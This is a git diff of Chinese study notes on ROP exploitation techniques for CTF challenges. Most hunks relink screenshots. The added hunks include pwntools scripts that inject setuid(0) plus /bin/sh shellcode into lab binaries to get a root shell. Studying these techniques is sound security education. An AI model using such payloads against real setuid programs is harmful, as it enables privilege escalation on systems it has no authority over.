@@ -502,13 +502,13 @@ vim -M file。
 
 
 
-## ==*ret2text==
+## ==*`ret2text`==
 
 ### Step1:识别
 
 **先检查保护机制：checksec** 
 
-![image-20220301214158015](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220301214158015.png)
+![checksec检查保护机制_ret2text](./2_解析ROP（返回导向编程）.assets/checksec检查保护机制_ret2text.png)
 
 #### ==<u>常见的保护机制：</u>==
 
@@ -542,9 +542,7 @@ vim -M file。
 
 ### Step3:观察该程序在执行过程中是否直接调用了system(/bin/sh)，即后门函数
 
-​	在getshell函数中，可以看到使用了该命令：
-
-![image-20220301215427650](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220301215427650.png)
+​	在getshell函数中，可以看到使用了该命令：![寻找后门函数](./2_解析ROP（返回导向编程）.assets/寻找后门函数.png)
 
 
 
@@ -552,13 +550,13 @@ vim -M file。
 
 ​	即：将该函数的首地址找到并将其写入上个函数栈帧的ret_address(也就是这里的gets溢出函数调用后的返回地址)即可！！！
 
-![image-20220301221439553](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220301221439553.png)
+![WP_ret2text](./2_解析ROP（返回导向编程）.assets/WP_ret2text.png)
 
 ------
 
 
 
-## ==*ret2shellcode==
+## ==*`ret2shellcode`==
 
 - shellcode的含义：
 
@@ -570,7 +568,7 @@ vim -M file。
 
 - ##### **先检查保护机制：checksec** 
 
-  ![image-20220302154210215](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220302154210215.png)
+  ![checksec_ret2shellcode](./2_解析ROP（返回导向编程）.assets/checksec_ret2shellcode.png)
 
   可以看到，正是由于该程序开启了RWX段，即可读，可写，可执行段，我们才能在栈上写入我们自己编写的执行system(/bin/sh)的代码，这道题才可用ret2shellcode解决。
 
@@ -578,9 +576,7 @@ vim -M file。
 
 - ##### 进一步确认是否属于ret2shellcode
 
-  1. 使用gdb调试中的vmmap命令查看RWX段：
-
-     ![image-20220302200246642](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220302200246642.png)
+  1. 使用gdb调试中的vmmap命令查看RWX段：![vmmap_ret2shellcode](./2_解析ROP（返回导向编程）.assets/vmmap_ret2shellcode.png)
 
   2. 在IDA上查看溢出区是否处于该段中
 
@@ -596,13 +592,9 @@ vim -M file。
   shellcraft.sh()
   ```
 
-  便可构造出相关代码：
+  便可构造出相关代码：![shell构造](./2_解析ROP（返回导向编程）.assets/shell构造.png)
 
-  ![image-20220302202639754](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220302202639754.png)
-
-  然后使用asm()函数将上面的代码转化为机器码：
-
-  ![image-20220302203144476](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220302203144476.png)
+  然后使用asm()函数将上面的代码转化为机器码：![将shellcode转化为机器码](./2_解析ROP（返回导向编程）.assets/将shellcode转化为机器码.png)
 
 - #### 对于64位程序：
 
@@ -623,6 +615,183 @@ vim -M file。
   ```python
   asm(shellcraft.amd64.sh())
   ```
+  
+- #### ==有时遇到权限不足的问题：==
+
+  > 可使用`setuid(0)`尝试提权
+
+  - **对于32位程序：**
+
+    构造`setuid(0)`的机器码：`asm(shellcraft.i386.linux.setuid(0))`
+
+  - **对于64位程序：**
+
+    构造`setuid(0)`的机器码：`asm(shellcraft.amd64.linux.setuid(0))`
+
+
+
+### `shellcode`的艺术
+
+#### ch1：
+
+> 二进制文件：[shellcode_ch1](./2_解析ROP（返回导向编程）.assets/shellcode_ch1)
+> C源码：[shellcode_ch1](./2_解析ROP（返回导向编程）.assets/shellcode_ch1.c)
+
+wp：
+
+```python
+from pwn import *
+import os
+os.chdir("/challenge")
+
+context.arch = 'amd64'
+
+file_name = './1-1-1'
+
+io = process(file_name)
+
+str = io.recvuntil("from stdin.\n")
+print(str.decode('utf-8'))
+
+payload = asm(shellcraft.amd64.linux.setuid(0) + shellcraft.amd64.sh())
+# payload = asm(shellcraft.i386.linux.setuid(0) + shellcraft.amd64.sh())
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+#### ch2：
+
+> 二进制文件：[shellcode_ch2](./2_解析ROP（返回导向编程）.assets/shellcode_ch2)
+> C源码：[shellcode_ch2](./2_解析ROP（返回导向编程）.assets/shellcode_ch2.c)
+
+wp：
+
+```python
+from pwn import *
+import os
+os.chdir("/challenge")
+
+context.arch = 'amd64'
+
+file_name = './1-1-2'
+
+io = process(file_name)
+
+str = io.recvuntil("from stdin.\n")
+print(str.decode('utf-8'))
+
+payload = b'\x90'*0x800 + asm(shellcraft.amd64.linux.setuid(0) + shellcraft.amd64.sh())
+# payload = asm(shellcraft.i386.linux.setuid(0) + shellcraft.amd64.sh())
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+#### ch3：
+
+> 二进制文件：[shellcode_ch3](./2_解析ROP（返回导向编程）.assets/shellcode_ch3)
+> C源码：[shellcode_ch3](./2_解析ROP（返回导向编程）.assets/shellcode_ch3.c)
+
+wp：
+
+```python
+from pwn import *
+import os
+os.chdir("/challenge")
+
+context.arch = 'amd64'
+
+file_name = './1-1-3'
+
+io = process(file_name)
+
+str = io.recvuntil("from stdin.\n")
+print(str.decode('utf-8'))
+
+shellcode = asm(shellcraft.sh())
+
+payload = asm(shellcraft.amd64.linux.setuid(0)) + shellcode
+# payload = asm(shellcraft.i386.linux.setuid(0) + shellcraft.amd64.sh())
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+#### ch4：
+
+> 二进制文件：[shellcode_ch4](./2_解析ROP（返回导向编程）.assets/shellcode_ch4)
+> C源码：[shellcode_ch4](./2_解析ROP（返回导向编程）.assets/shellcode_ch4.c)
+
+wp：
+
+```python
+from pwn import *
+import os
+os.chdir("/challenge")
+
+context.arch = 'amd64'
+
+file_name = './1-1-4'
+
+io = process(file_name)
+
+str = io.recvuntil("from stdin.\n")
+print(str.decode('utf-8'))
+
+# 构造 setuid(0) 的 shellcode
+setuid0 = asm("""
+    xor rax, rax                ;清除 rax
+    mov al, 105                 ;系统调用号 105 - setuid
+    xor rdi, rdi                ;设置 rdi = 0 (uid 0)
+
+    ;动态写入 syscall 指令
+    lea rcx, [rip+syscall_instr] ;指向即将形成 syscall 的位置
+    mov byte ptr [rcx], 0x0f     ;写入前一半 0x0f
+    mov byte ptr [rcx+1], 0x05   ;写入后一半 0x05
+
+syscall_instr:
+    nop                         ;此处将变为 syscall
+    jmp syscall_instr           ;跳到 syscall
+
+""")
+
+# 构造 shellcode
+shellcode = asm("""
+    xor rax, rax                ;Clear rax
+    mov al, 59                  ;Syscall number for execve
+    lea rdi, [rip+binsh_str]    ;Address of "/bin/sh" into rdi
+    xor rsi, rsi                ;rsi = NULL (argv)
+    xor rdx, rdx                ;rdx = NULL (envp)
+
+    ;动态写入 syscall 指令
+    lea rcx, [rip+syscall_instr] ;指向即将形成 syscall 的位置
+    mov byte ptr [rcx], 0x0f     ;写入前一半 0x0f
+    mov byte ptr [rcx+1], 0x05   ;写入后一半 0x05
+
+syscall_instr:
+    nop                         ;此处将变为 syscall
+    jmp syscall_instr           ;跳回 syscall
+
+binsh_str:
+    .ascii "/bin/sh"           ;Shell command string
+    .byte 0x00
+""")
+
+# shellcode = asm(shellcraft.sh())
+print(shellcode)
+
+
+payload = setuid0 + shellcode
+# payload = asm(shellcraft.i386.linux.setuid(0) + shellcraft.amd64.sh())
+
+io.sendline(payload)
+
+io.interactive()
+```
 
 
 
@@ -632,21 +801,19 @@ vim -M file。
 
 
 
-## ==*ret2syscall==
+## ==*`ret2syscall`==
 
 ### x86(32位)与x86-64(64位)的函数调用栈：
 
-![image-20220311110403217](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220311110403217.png)
+![函数调用栈](./2_解析ROP（返回导向编程）.assets/函数调用栈.jpg)
 
 #### 接下来我们对于这一简单的程序来进行讲解：
 
-![image-20220311111544711](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220311111544711.png)
+<img src="./2_解析ROP（返回导向编程）.assets/函数调用栈实例解析-源文件.jpg" alt="函数调用栈实例解析-源文件" style="zoom:50%;" />
 
 经过编译并使用IDA反编译便可得到其汇编代码，gdb调试便可得知其工作原理：
 
-![image-20220311112208664](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220311112208664.png)
-
-![image-20220311112218592](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220311112218592.png)
+<img src="./2_解析ROP（返回导向编程）.assets/函数调用栈实例解析-x86.jpg" alt="函数调用栈实例解析-x86" style="zoom:33%;" /><img src="./2_解析ROP（返回导向编程）.assets/函数调用栈实例解析-x64.jpg" alt="函数调用栈实例解析-x64" style="zoom:33%;" />
 
 ### 系统调用所需环境(32位)
 
@@ -670,13 +837,9 @@ vim -M file。
 
 1. 计算从写入位置到retaddr需要填充多少个字节的垃圾数据：
 
-   利用pwndbg:
+   利用pwndbg:![pwndbg查看栈结构](./2_解析ROP（返回导向编程）.assets/pwndbg查看栈结构.png)
 
-   ![image-20220212171639342](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212171639342.png)
-
-   计算0xffffd098-0xffffd20c：
-
-   ![image-20220212171920736](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212171920736.png)
+   计算0xffffd098-0xffffd20c：![python计算偏移](./2_解析ROP（返回导向编程）.assets/python计算偏移.png)
 
    得需要填充108+4=112字节的数据。
 
@@ -689,17 +852,15 @@ vim -M file。
 
    比如找到的是如下的一些指令：
 
-   ![image-20220212120349199](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212120349199.png)
+   ![pop_ret1](./2_解析ROP（返回导向编程）.assets/pop_ret1.png)
 
-   ![image-20220212120607325](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212120607325.png)
+   ![pop_ret2](./2_解析ROP（返回导向编程）.assets/pop_ret2.png)
 
-   ![image-20220212122257731](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212122257731.png)
+   ![pop_ret3](./2_解析ROP（返回导向编程）.assets/pop_ret3.png)
 
 3. 找到./bin/sh的地址：
 
-   - 用IDA pro：shift+F12 获得字符串窗口，CTRL+f 打开查找窗口，输入要查找的内容
-
-     ![image-20220212122751339](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212122751339.png)
+   - 用IDA pro：`shift+F12` 获得字符串窗口，`CTRL+f` 打开查找窗口，输入要查找的内容：![ida查看字符串地址](./2_解析ROP（返回导向编程）.assets/ida查看字符串地址.png)
 
      双击进入查看地址即可！
 
@@ -711,14 +872,11 @@ vim -M file。
      elf = ELF("./filename")
      hex(next(elf.search(b"/bin/sh")))
      ```
+   
+4. 画出此时函数栈中需要溢出的数据图：![构造栈执行流](./2_解析ROP（返回导向编程）.assets/构造栈执行流.png)
 
-4. 画出此时函数栈中需要溢出的数据图：
+5. 得到payload：![wp_ret2syscall](./2_解析ROP（返回导向编程）.assets/wp_ret2syscall.png)
 
-   ![image-20220212171314748](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212171314748.png)
-
-5. 得到payload:
-
-   ![image-20220212123617414](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220212123617414.png)
 
 ### 系统调用所需环境(64位)
 
@@ -734,9 +892,7 @@ vim -M file。
 - ==**rdx = 0x0**==
 - ==**execve("/bin/sh", 0, 0);**==
 
-
-
-![image-20220306230249735](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220306230249735.png)
+![系统调用rop_x64](./2_解析ROP（返回导向编程）.assets/系统调用rop_x64.png)
 
 **在这里要注意：64位系统在传参时与32位系统有所不同：**
 
@@ -814,7 +970,7 @@ vim -M file。
       ROPgadget --binary <filename> --opcode cd80c3
       ```
 
-### **<u>==ret2csu==</u>**
+### **<u>==`ret2csu`==</u>**
 
 - ##### 		这种攻击手段其实是为我们通过Rop找可用的gadget提供了另外一种途径，很多教程中把它归结为一种单独的攻击方式，但其实这种攻击方式类似于组合拳中的一招一式，是可以和其他攻击手段结合在一起使用的！！！
 
@@ -827,11 +983,11 @@ vim -M file。
    __libc_csu_init Gadgets for x64
    ```
 
-   ![image-20220308225505798](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220308225505798.png)
+   ![libc_csu_init汇编代码](./2_解析ROP（返回导向编程）.assets/libc_csu_init汇编代码.png)
 
    #### 如上便是我们主要用到的gadget。
 
-   ![image-20220308092659452](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220308092659452.png)
+   ![csu_gadget](./2_解析ROP（返回导向编程）.assets/csu_gadget.png)
 
    这个位于text段的函数里含有大量我们可用的Gadget，因此可以丰富Rop攻击的手段。
    
@@ -841,7 +997,7 @@ vim -M file。
 
    ##### gadget1：
 
-   ![image-20220308230838199](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220308230838199.png)
+   ![csu_gadget1](./2_解析ROP（返回导向编程）.assets/csu_gadget1.png)
 
    ##### gadget1可以将你构造的栈中的值一个一个顺序存到rbx,rbp,r12,r13,r14,r15寄存器中。 需要注意的是，可能随着环境的不同，r13,r14,r15的顺序也会有所改变。
 
@@ -849,7 +1005,7 @@ vim -M file。
 
    ##### gadget2：
 
-   ![image-20220308231317384](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220308231317384.png)
+   ![csu_gadget2](./2_解析ROP（返回导向编程）.assets/csu_gadget2.png)
 
    ##### 通过gadgets1中最后的ret，使程序流程走gadget2，这样可以：
 
@@ -908,21 +1064,17 @@ vim -M file。
         readelf -Ws <程序名> | grep "init"
         ```
 
-        ![image-20220308235533755](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220308235533755.png)
+        ![程序符号表](./2_解析ROP（返回导向编程）.assets/程序符号表.png)
 
       ==**但是**==，这样的调用方法也会有缺点，那就是等到跳转到vul函数空间时，rdi和rsi寄存器中的值已经被改变了，但rdx寄存器中保留的第三个参数已经被我们控制。也就是说我们还需要找gadget重新给这两个寄存器赋值，进而控制前两个参数，不过最麻烦的第三个参数解决了，别的应该都不是什么问题。
 
 4. #### ***<u>==__libc_csu_init的其他形式==：</u>***
 
-   有时会遇到IDA反编译出不同的gadget形式：
-
-   ![image-20220309192231159](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220309192231159.png)
+   有时会遇到IDA反编译出不同的gadget形式：![csu_gadget1_anotherVer](./2_解析ROP（返回导向编程）.assets/csu_gadget1_anotherVer.png)
 
    在这里我们可以看到：gadget2的形式并没有变化，但gadget1的形式有所改变，由pop变成了move。为了搞清楚这段汇编代码的工作原理以及这样的改变对我们构造payload的影响，我们采用gdb进行如下调试：
 
-   1. 设置断点并运行至溢出位置：
-
-      ![image-20220309195447653](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220309195447653.png)
+   1. 设置断点并运行至溢出位置：![gdb-设置断点并运行至溢出位置](./2_解析ROP（返回导向编程）.assets/gdb-设置断点并运行至溢出位置.png)
 
    2. 为了查看函数跳转后rsp的实际位置，我们先将payload填充到vulnerable_function的ret_addr处，同时为了使用ret2csu，我们在写payload时将vulnerable_function的ret_addr填写为gadget1进入地址：
 
@@ -931,12 +1083,10 @@ vim -M file。
       payload = b'a' * (0x80+8) + p64(first_gadget)
       print(payload)
       ```
-
+   
       进而输出这段payload的机器码。
-
-   3. 我们将输出的payload的机器码填充进去，继续步进：
-
-      ![image-20220309212903045](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220309212903045.png)
+   
+   3. 我们将输出的payload的机器码填充进去，继续步进：![gdb-填充机器码并步进](./2_解析ROP（返回导向编程）.assets/gdb-填充机器码并步进.png)
 
       可以看到：程序显示收到了段错误。这是正常的，因为本身我们就进行了溢出。
 
@@ -944,17 +1094,11 @@ vim -M file。
 
    4. 输入return，使得程序返回到我们的gadget后，可以看到我们的栈顶指针指向了ret_addr起始位置的后8个字节的位置，这与我们所学习的函数调用栈的工作方式是相吻合的。
 
-      那么现在函数调用栈就执行到了如下位置：
+      那么现在函数调用栈就执行到了如下位置：![函数调用栈当前执行位置](./2_解析ROP（返回导向编程）.assets/函数调用栈当前执行位置.png)
 
-      ![image-20220309223650819](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220309223650819.png)
+   5. 为了方便我们进一步的调试，我们重新gdb调试该程序，并将断点设置在gadget1的位置：![gdb_设置断点至gadget1](./2_解析ROP（返回导向编程）.assets/gdb_设置断点至gadget1.png)
 
-   5. 为了方便我们进一步的调试，我们重新gdb调试该程序，并将断点设置在gadget1的位置：
-
-      ![image-20220309224447777](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220309224447777.png)
-
-      之后让程序run起来：
-
-      ![image-20220309231722607](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220309231722607.png)
+      之后让程序run起来：![gdb_run](./2_解析ROP（返回导向编程）.assets/gdb_run.png)
 
       由此可以看出，执行完ret_addr后，程序会先将rsp比高8个字节的地址起存放的数据放在rbx寄存器里，再将比rsp高0x10=16个字节起存放的数据放在rbp寄存器里，然后以此类推.......由此我们可以看出：在payload写完ret_addr之后，我们需要先存放8字节的垃圾数据，然后在ret_addr末尾起的第9--16字节的位置填充我们将要放在rbx中的数据，在ret_addr末尾起的第17--24字节的位置填充我们将要放在rbp中的数据......等到我们在从第0x30+1=49--56字节填入我们想要在r15中放入的数据后，程序会执行：
 
@@ -976,7 +1120,7 @@ vim -M file。
 
 
 
-## ==*ret2libc==
+## ==*`ret2libc`==
 
 ### 平衡栈：
 
@@ -990,16 +1134,22 @@ vim -M file。
 
 - ### 用一个实例来看一下：
 
-  ![image-20220312180243550](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220312180243550.png)
+  ![动态链接_源码](./2_解析ROP（返回导向编程）.assets/动态链接_源码.png)
 
   1. 将这两段c代码通过如下命令编译为可执行文件func.ELF2：
 
-     ![image-20220312180419286](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220312180419286.png)
+     ![动态链接_编译](./2_解析ROP（返回导向编程）.assets/动态链接_编译.png)
 
   2. 我们通过gdb调试查看可执行文件func.ELF2第一次调用func.c生成的共享链接库中func函数时的汇编代码：
-     ![image-20220312180745242](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220312180745242.png)
+     ![动态链接_gdb查看got](./2_解析ROP（返回导向编程）.assets/动态链接_gdb查看got.png)
 
-     - ##### 可以看到，执行call指令会进入func@plt，第一条jmp指令找到对应的GOT条目，这时该位置保存的还是第二条指令的地址，于是执行第二条指令push，将对应的0x1（func在.rel.plt中的下标）压栈，然后进入PLT[0]。PLT[0]先将GOT[1]压栈，然后调用GOT[2]，也就是动态链接器的_dl_runtime_resolve()函数，完成符号解析和重定位工作，并将func()的真实地址填入func@got.plt，也就是GOT[4]，最后才把控制权交给func()。延迟绑定完成后，如果再调用func()，就可以由func@plt的第一条指令直接跳转到func@got.plt，将控制权交给func()。 
+     1. ##### 可以看到，执行call指令会进入func@plt；
+     
+     2. ##### 第一条jmp指令跳转到 `GOT`（Global Offset Table）表中的对应条目（即 `func@got.plt`），这时该位置保存的还是第二条指令的地址，于是执行第二条指令push，将对应的0x1（func在.rel.plt中的下标）压栈，然后进入PLT[0]；
+     
+     3. ##### PLT[0]先将GOT[1]压栈，然后调用GOT[2]，也就是动态链接器的_dl_runtime_resolve()函数，完成符号解析和重定位工作，并将func()的真实地址填入`func@got.plt`，也就是GOT[4]，最后才把控制权交给func()；
+     
+     4. ##### 延迟绑定完成后，如果再调用func()，就可以由func@plt的第一条指令直接跳转到func@got.plt，将控制权交给func()。 
 
 - 思考----->由上面的动态链接的过程我们可知：
 
@@ -1019,7 +1169,7 @@ vim -M file。
 
   就可以查到该程序使用到的本地的动态链接库的文件包括其详细信息，还有其软链接路径！
 
-  ![image-20220303111551683](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220303111551683.png)
+  ![查看程序链接库版本](./2_解析ROP（返回导向编程）.assets/查看程序链接库版本.png)
 
 - 通过软链接找到libc的详细版本号：
 
@@ -1027,7 +1177,7 @@ vim -M file。
   file 软链接路径
   ```
 
-  ![image-20220303111840394](C:\Users\赵睿智\AppData\Roaming\Typora\typora-user-images\image-20220303111840394.png)
+  ![查看链接库详细版本号](./2_解析ROP（返回导向编程）.assets/查看链接库详细版本号.png)
 
   由上可知我们使用的libc的详细版本号（也就是题目会给的libc文件）为：libc-2.31.so。
 
